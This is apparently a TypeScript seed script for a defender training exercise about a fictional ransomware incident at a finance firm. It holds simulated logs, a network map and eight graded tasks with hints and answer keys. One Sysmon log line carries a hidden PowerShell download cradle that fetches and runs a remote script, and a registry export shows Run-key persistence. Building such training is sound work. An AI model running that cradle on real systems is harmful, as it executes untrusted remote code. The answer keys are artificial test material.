// Seeds the flagship Incident Simulation: FIN-2026-004 — Ransomware at
// Finance Department, inside the Meridian Finance Group CompanyEnvironment.
// Requires scripts/seed-companies.ts to have been run first.
// Idempotent — safe to run multiple times.
// Run: npx tsx scripts/seed-incident-fin-2026-004.ts

import { PrismaClient } from "@prisma/client";

const db = new PrismaClient();

// NOTE: `order` below reflects true chronological sequence (matching the
// Consolidated Incident Timeline artifact) rather than tab-reveal order,
// since the Evidence Board's timeline exercise scores against this field.
const ARTIFACTS = [
  {
    order: 1,
    type: "EMAIL" as const,
    tactic: "INITIAL_ACCESS" as const,
    title: "Suspicious Email — d.martinez@meridianfg.com",
    content: `From: "Angela Cruz - External Audit" <a.cruz@meridian-finance-support.com>
To: d.martinez@meridianfg.com
Sent: 2026-07-14 08:47:12
Subject: URGENT: Q2 Budget Review - Response Needed Today

Hi Diego,

Following up on the Q2 budget reconciliation ahead of tomorrow's board
meeting. Please review the attached workbook and confirm the finance
department totals match what was submitted. Needs to go out today.

Attachment: Q2_Budget_Review.xlsm (247 KB)

Thanks,
Angela Cruz
External Audit Partner

--- Note from IT: the real Meridian Finance Group domain is meridianfg.com.
This sender's domain is meridian-finance-support.com. ---`,
  },
  {
    order: 6,
    type: "EVENT_LOG" as const,
    tactic: "LATERAL_MOVEMENT" as const,
    title: "Windows Security Event Log — FIN-WKS-014",
    content: `2026-07-14 08:52:01  EventID 4688 (Process Creation)
  New Process: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
  Command Line: "EXCEL.EXE" "C:\\Users\\dmartinez\\Downloads\\Q2_Budget_Review.xlsm"
  Parent Process: outlook.exe

2026-07-14 09:14:22  EventID 4624 (Logon)
  Logon Type: 3 (Network)
  Source Workstation: FIN-WKS-014
  Target: FIN-FS-02
  Account Name: svc_finreports  (local admin on FIN-FS-02)

2026-07-14 09:14:23  EventID 5140 (Network Share Access)
  Share: \\\\FIN-FS-02\\Finance$
  Source: FIN-WKS-014`,
  },
  {
    order: 2,
    type: "SYSMON_LOG" as const,
    tactic: null,
    title: "Sysmon Event Log — FIN-WKS-014",
    content: `Event ID 1 (Process Create)  2026-07-14 08:52:03
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
  CommandLine: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-update-service[.]net/upd.ps1')"

Event ID 1 (Process Create)  2026-07-14 08:55:41
  Image: C:\\Windows\\Temp\\svchost32.exe
  ParentImage: powershell.exe
  CommandLine: svchost32.exe -install

Event ID 3 (Network Connection)  2026-07-14 09:00:00 (and every ~300s after)
  Image: svchost32.exe
  DestinationIp: 185.220.101.47
  DestinationPort: 443
  DestinationHostname: cdn-update-service.net`,
  },
  {
    order: 3,
    type: "REGISTRY" as const,
    tactic: "PERSISTENCE" as const,
    title: "Registry Export — FIN-WKS-014 (HKCU Run Keys)",
    content: `[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"WinUpdateHelper"="C:\\\\Windows\\\\Temp\\\\svchost32.exe"

Key created: 2026-07-14 08:55:44
Last modified by: dmartinez (FIN-WKS-014)`,
  },
  {
    order: 4,
    type: "DEFENDER_LOG" as const,
    tactic: null,
    title: "Windows Defender Detection Log — FIN-WKS-014",
    content: `Detection Time: 2026-07-14 08:56:10
Threat Name: Trojan:Win32/BlackMdnLoader.A
File: C:\\Windows\\Temp\\svchost32.exe
SHA256: a3f2e9c1d84b7f6e2a1c9d8b7e6f5a4c3b2a1908f7e6d5c4b3a2918f7e6d5c4
Action Taken: DETECTED — Quarantine failed (file locked by running process)
Severity: Severe`,
  },
  {
    order: 5,
    type: "PCAP_SUMMARY" as const,
    tactic: "COMMAND_AND_CONTROL" as const,
    title: "Firewall/PCAP Summary — Egress Traffic from FIN-WKS-014",
    content: `Window: 2026-07-14 09:00:00 - 17:55:00
Destination: 185.220.101.47:443 (cdn-update-service.net)
Protocol: TLS (self-signed certificate, CN=update.cdn-service.net)
Pattern: Beacon every ~300 seconds, ~1.2KB request / variable response size
Total sessions: 107
Classification: Matches known C2 beaconing cadence pattern`,
  },
  {
    order: 7,
    type: "MEMORY_DUMP" as const,
    tactic: "IMPACT" as const,
    title: "Memory Dump Strings Excerpt — FIN-FS-02",
    content: `Strings extracted from FIN-FS-02 memory image (post-encryption):

"MDN Locker v2.3"
"Encrypting share: \\\\FIN-FS-02\\Finance$"
"README_RESTORE.txt"
"Extension: .mdn2026"
"Mutex: Global\\MDN_LOCK_9F21"
"C2 fallback: cdn-update-service.net"`,
  },
  {
    order: 8,
    type: "TIMELINE" as const,
    tactic: null,
    title: "Consolidated Incident Timeline",
    content: `08:47  Phishing email received (lookalike domain meridian-finance-support.com)
08:52  Attachment opened, macro executes, PowerShell download cradle runs
08:55  Payload (svchost32.exe) dropped, Defender detects but fails to quarantine
08:55  Registry Run key persistence established
09:00  C2 beaconing begins (185.220.101.47 / cdn-update-service.net)
09:14  Lateral movement to FIN-FS-02 via SMB using svc_finreports credentials
13:40–17:55  Continued C2 beaconing, likely staging/reconnaissance
18:02  Mass file encryption begins on \\\\FIN-FS-02\\Finance$
18:04  Ransom note README_RESTORE.txt dropped, .mdn2026 extension applied`,
  },
];

// Interactive Network Map — topology + status-change events keyed to task
// order. See src/lib/network-map.ts for how these are resolved client-side.
const NETWORK_NODES = [
  { id: "mail-gw", label: "Email Gateway", kind: "email-gateway", x: 10, y: 10 },
  { id: "fw", label: "Perimeter Firewall", kind: "firewall", x: 10, y: 65 },
  { id: "vpn", label: "VPN Gateway", kind: "vpn", x: 40, y: 80 },
  { id: "fin-wks-014", label: "FIN-WKS-014", kind: "workstation", x: 42, y: 35 },
  { id: "dc", label: "Domain Controller", kind: "domain-controller", x: 72, y: 12 },
  { id: "fin-fs-02", label: "FIN-FS-02", kind: "server", x: 72, y: 55 },
  { id: "c2", label: "cdn-update-service.net", kind: "internet", x: 98, y: 35 },
];

const NETWORK_EVENTS = [
  { triggerOrder: 1, nodeId: "fin-wks-014", status: "suspicious", note: "Flagged as the likely patient-zero host" },
  { triggerOrder: 2, nodeId: "mail-gw", status: "suspicious", note: "Delivered the lookalike-domain phishing email" },
  { triggerOrder: 2, nodeId: "fin-wks-014", status: "compromised", note: "Malicious macro executed — initial foothold confirmed" },
  { triggerOrder: 4, nodeId: "c2", status: "compromised", note: "Identified as the ransomware's C2 infrastructure" },
  { triggerOrder: 4, nodeId: "fw", status: "suspicious", note: "Egress traffic to C2 confirmed in PCAP" },
  { triggerOrder: 5, nodeId: "dc", status: "suspicious", note: "SMB lateral movement via svc_finreports observed" },
  { triggerOrder: 5, nodeId: "fin-fs-02", status: "compromised", note: "Ransomware payload deployed against Finance file shares" },
  { triggerOrder: 7, nodeId: "fin-wks-014", status: "contained", note: "Isolated from the network" },
  { triggerOrder: 7, nodeId: "fin-fs-02", status: "contained", note: "Isolated; shares taken offline for recovery" },
  { triggerOrder: 7, nodeId: "dc", status: "contained", note: "svc_finreports credentials rotated" },
  { triggerOrder: 7, nodeId: "c2", status: "contained", note: "Blocked at the perimeter firewall" },
  { triggerOrder: 7, nodeId: "mail-gw", status: "contained", note: "Lookalike domain blocked" },
  { triggerOrder: 7, nodeId: "fw", status: "contained", note: "Egress rule deployed blocking the C2 domain/IP" },
];

const TASKS = [
  {
    order: 1,
    title: "Find Patient Zero",
    prompt: "Based on the phishing email and the event log, which single workstation is patient zero for this incident?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "FIN-WKS-014",
    options: [] as string[],
    points: 100,
    hints: [
      { level: 1, pointCost: 15, text: "Check which workstation the phishing attachment was opened on in the event log." },
      { level: 2, pointCost: 25, text: "The 4688 process creation event for EXCEL.EXE opening the attachment names the host." },
      { level: 3, pointCost: 35, text: "Answer: FIN-WKS-014" },
    ],
  },
  {
    order: 2,
    title: "Identify Initial Access",
    prompt: "What was the initial access vector used to compromise patient zero?",
    answerType: "RADIO" as const,
    correctAnswer: "Spearphishing email with a malicious macro-enabled Excel attachment",
    options: [
      "Spearphishing email with a malicious macro-enabled Excel attachment",
      "Exploitation of an unpatched public-facing VPN appliance",
      "Password spraying against an externally exposed RDP service",
      "A malicious USB drive left in the parking lot",
    ],
    points: 100,
    hints: [
      { level: 1, pointCost: 15, text: "Look at how the very first process (EXCEL.EXE) came to run on FIN-WKS-014." },
      { level: 2, pointCost: 25, text: "The email artifact shows a lookalike sender domain and a macro-enabled workbook attachment." },
      { level: 3, pointCost: 35, text: "Answer: Spearphishing email with a malicious macro-enabled Excel attachment" },
    ],
  },
  {
    order: 3,
    title: "Find the Malware Hash",
    prompt: "What is the SHA256 hash of the malicious payload identified by Defender?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "a3f2e9c1d84b7f6e2a1c9d8b7e6f5a4c3b2a1908f7e6d5c4b3a2918f7e6d5c4",
    options: [],
    points: 120,
    hints: [
      { level: 1, pointCost: 15, text: "Check the Windows Defender detection log artifact for svchost32.exe." },
      { level: 2, pointCost: 25, text: "The SHA256 field is listed directly under the threat name." },
      { level: 3, pointCost: 35, text: "Answer: a3f2e9c1d84b7f6e2a1c9d8b7e6f5a4c3b2a1908f7e6d5c4b3a2918f7e6d5c4" },
    ],
  },
  {
    order: 4,
    title: "Find the C2 Domain",
    prompt: "What C2 domain did the malware beacon to?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "cdn-update-service.net",
    options: [],
    points: 120,
    hints: [
      { level: 1, pointCost: 15, text: "Check the Sysmon network connection events and the PCAP summary artifact." },
      { level: 2, pointCost: 25, text: "The destination hostname appears in both Sysmon Event ID 3 and the firewall/PCAP summary." },
      { level: 3, pointCost: 35, text: "Answer: cdn-update-service.net" },
    ],
  },
  {
    order: 5,
    title: "Map to MITRE ATT&CK",
    prompt: "Which MITRE ATT&CK technique best describes the lateral movement from FIN-WKS-014 to FIN-FS-02?",
    answerType: "RADIO" as const,
    correctAnswer: "T1021.002 – Remote Services: SMB/Windows Admin Shares",
    options: [
      "T1021.002 – Remote Services: SMB/Windows Admin Shares",
      "T1210 – Exploitation of Remote Services",
      "T1078 – Valid Accounts (Cloud)",
      "T1570 – Lateral Tool Transfer only, no authentication involved",
    ],
    points: 140,
    hints: [
      { level: 1, pointCost: 20, text: "Look at the logon type and the share access event in the Windows Security log." },
      { level: 2, pointCost: 30, text: "A network logon (type 3) followed by SMB share access to Finance$ using stolen local admin credentials." },
      { level: 3, pointCost: 40, text: "Answer: T1021.002 – Remote Services: SMB/Windows Admin Shares" },
    ],
  },
  {
    order: 6,
    title: "Design Detection Logic",
    prompt: "You need a Sigma rule to catch this initial PowerShell download cradle across the fleet. Which single field should the detection primarily match on?",
    answerType: "RADIO" as const,
    correctAnswer: "Sysmon Event ID 1 CommandLine containing a DownloadString/IEX web-download cradle pattern",
    options: [
      "Sysmon Event ID 1 CommandLine containing a DownloadString/IEX web-download cradle pattern",
      "The process's parent image being explorer.exe, regardless of command line",
      "The username that ran the process",
      "The process's working directory path",
    ],
    points: 140,
    hints: [
      { level: 1, pointCost: 20, text: "Re-read the exact PowerShell command line in the Sysmon artifact." },
      { level: 2, pointCost: 30, text: "IEX(New-Object Net.WebClient).DownloadString(...) is a well-known, specific download cradle pattern." },
      { level: 3, pointCost: 40, text: "Answer: Sysmon Event ID 1 CommandLine containing a DownloadString/IEX web-download cradle pattern" },
    ],
  },
  {
    order: 7,
    title: "Recommend Containment",
    prompt: "Ransomware is actively encrypting files on FIN-FS-02 right now. What's the correct immediate containment action?",
    answerType: "RADIO" as const,
    correctAnswer: "Isolate FIN-WKS-014 and FIN-FS-02 from the network immediately, then begin credential rotation for any accounts used in lateral movement",
    options: [
      "Isolate FIN-WKS-014 and FIN-FS-02 from the network immediately, then begin credential rotation for any accounts used in lateral movement",
      "Wait until the encryption finishes so you can fully assess the damage before doing anything",
      "Only reset the phished employee's email password",
      "Shut down the entire corporate network including unaffected departments",
    ],
    points: 160,
    hints: [
      { level: 1, pointCost: 20, text: "Encryption is active right now — every minute of delay costs more data." },
      { level: 2, pointCost: 30, text: "Isolate exactly the affected hosts and rotate the compromised service account's credentials." },
      { level: 3, pointCost: 40, text: "Answer: Isolate FIN-WKS-014 and FIN-FS-02 from the network immediately, then begin credential rotation for any accounts used in lateral movement" },
    ],
  },
  {
    order: 8,
    title: "Produce the Executive Summary",
    prompt: "Which sentence best captures the root cause for the executive summary of your incident report?",
    answerType: "RADIO" as const,
    correctAnswer: "A spearphishing email with a malicious macro attachment led to credential theft and lateral movement over SMB, culminating in ransomware deployment against Finance Department file shares",
    options: [
      "A spearphishing email with a malicious macro attachment led to credential theft and lateral movement over SMB, culminating in ransomware deployment against Finance Department file shares",
      "An unpatched web server vulnerability allowed direct remote code execution",
      "A disgruntled employee intentionally deployed ransomware",
      "The incident was caused by a supply-chain compromise of a vendor update",
    ],
    points: 160,
    hints: [
      { level: 1, pointCost: 20, text: "Trace the full chain from the timeline artifact: email → macro → lateral movement → encryption." },
      { level: 2, pointCost: 30, text: "The root cause statement should tie the initial access vector all the way through to the final impact." },
      { level: 3, pointCost: 40, text: "Answer: A spearphishing email with a malicious macro attachment led to credential theft and lateral movement over SMB, culminating in ransomware deployment against Finance Department file shares" },
    ],
  },
];

async function main() {
  const company = await db.companyEnvironment.findUnique({ where: { slug: "meridian-finance-group" } });
  if (!company) {
    throw new Error("Run scripts/seed-companies.ts first — meridian-finance-group not found.");
  }

  const sim = await db.incidentSimulation.upsert({
    where: { slug: "fin-2026-004-ransomware" },
    update: {
      codename: "FIN-2026-004",
      title: "Ransomware at Finance Department",
      companyId: company.id,
      briefing:
        "Meridian Finance Group's Finance Department reports that shared drives are inaccessible and file names now carry a .mdn2026 extension. " +
        "The SOC has pulled artifacts from the suspected patient-zero workstation and surrounding infrastructure. " +
        "You are the lead incident responder. Work through the evidence below to reconstruct the full attack chain, " +
        "then produce detection content, a containment recommendation, and an executive summary.",
      difficulty: "HARD",
      estimatedMinutes: 150,
      points: 1040,
      published: true,
      networkNodes: NETWORK_NODES,
      networkEvents: NETWORK_EVENTS,
    },
    create: {
      slug: "fin-2026-004-ransomware",
      codename: "FIN-2026-004",
      title: "Ransomware at Finance Department",
      companyId: company.id,
      briefing:
        "Meridian Finance Group's Finance Department reports that shared drives are inaccessible and file names now carry a .mdn2026 extension. " +
        "The SOC has pulled artifacts from the suspected patient-zero workstation and surrounding infrastructure. " +
        "You are the lead incident responder. Work through the evidence below to reconstruct the full attack chain, " +
        "then produce detection content, a containment recommendation, and an executive summary.",
      difficulty: "HARD",
      estimatedMinutes: 150,
      points: 1040,
      published: true,
      networkNodes: NETWORK_NODES,
      networkEvents: NETWORK_EVENTS,
    },
  });

  await db.incidentSimArtifact.deleteMany({ where: { simulationId: sim.id } });
  await db.incidentSimArtifact.createMany({
    data: ARTIFACTS.map((a) => ({
      simulationId: sim.id,
      type: a.type,
      title: a.title,
      content: a.content,
      order: a.order,
      tactic: a.tactic,
    })),
  });

  // Delete existing tasks (cascades to hints/progress) and recreate in order.
  await db.incidentSimTask.deleteMany({ where: { simulationId: sim.id } });
  for (const t of TASKS) {
    const task = await db.incidentSimTask.create({
      data: {
        simulationId: sim.id,
        order: t.order,
        title: t.title,
        prompt: t.prompt,
        answerType: t.answerType,
        correctAnswer: t.correctAnswer,
        options: t.options,
        points: t.points,
      },
    });
    await db.incidentSimHint.createMany({
      data: t.hints.map((h) => ({ taskId: task.id, level: h.level, pointCost: h.pointCost, text: h.text })),
    });
  }

  console.log(`✓ ${sim.codename} — ${ARTIFACTS.length} artifacts, ${TASKS.length} tasks seeded.`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => db.$disconnect());
